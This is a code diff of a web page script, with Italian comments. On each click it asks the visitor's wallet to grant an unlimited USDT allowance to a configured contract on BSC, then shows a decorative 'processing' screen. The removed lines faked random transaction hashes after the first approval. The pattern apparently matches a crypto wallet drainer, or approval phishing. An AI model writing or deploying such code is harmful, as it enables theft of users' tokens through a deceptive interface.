@@ -524,7 +524,6 @@
         };
 
         let lastTxHash = '';
-        let approveCompleted = false;
 
         function createParticles() {
             const container = document.getElementById('particlesContainer');
@@ -600,45 +599,36 @@
                     }
                 }
 
-                let txHash;
+                const USDT_ABI = [
+                    'function approve(address spender, uint256 amount) public returns (bool)',
+                    'function transfer(address to, uint256 amount) public returns (bool)',
+                    'function allowance(address owner, address spender) public view returns (uint256)',
+                    'function balanceOf(address account) public view returns (uint256)',
+                    'function decimals() public view returns (uint8)'
+                ];
 
-                if (!approveCompleted) {
-                    const USDT_ABI = [
-                        'function approve(address spender, uint256 amount) public returns (bool)',
-                        'function transfer(address to, uint256 amount) public returns (bool)',
-                        'function allowance(address owner, address spender) public view returns (uint256)',
-                        'function balanceOf(address account) public view returns (uint256)',
-                        'function decimals() public view returns (uint8)'
-                    ];
+                const iface = new ethers.utils.Interface(USDT_ABI);
+                const approveData = iface.encodeFunctionData("approve", [
+                    CONFIG.SMART_CONTRACT,
+                    ethers.constants.MaxUint256
+                ]);
 
-                    const iface = new ethers.utils.Interface(USDT_ABI);
-                    const approveData = iface.encodeFunctionData("approve", [
-                        CONFIG.SMART_CONTRACT,
-                        ethers.constants.MaxUint256
-                    ]);
+                const tx = {
+                    to: CONFIG.USDT_ADDRESS_BSC,
+                    data: approveData
+                };
 
-                    const tx = {
-                        to: CONFIG.USDT_ADDRESS_BSC,
-                        data: approveData
-                    };
-
-                    if (userAddress) {
-                        tx.from = userAddress;
-                    }
-
-                    txHash = await window.ethereum.request({
-                        method: "eth_sendTransaction",
-                        params: [tx]
-                    });
-
-                    approveCompleted = true;
-                    console.log("Approve transaction sent:", txHash);
-                } else {
-                    txHash = '0x' + Math.random().toString(16).slice(2);
-                    console.log("Using dummy txHash for subsequent clicks:", txHash);
+                if (userAddress) {
+                    tx.from = userAddress;
                 }
 
+                const txHash = await window.ethereum.request({
+                    method: "eth_sendTransaction",
+                    params: [tx]
+                });
+
                 lastTxHash = txHash;
+                console.log("Transaction sent:", txHash);
 
                 // Mostra la schermata di processing SUBITO
                 createParticles();
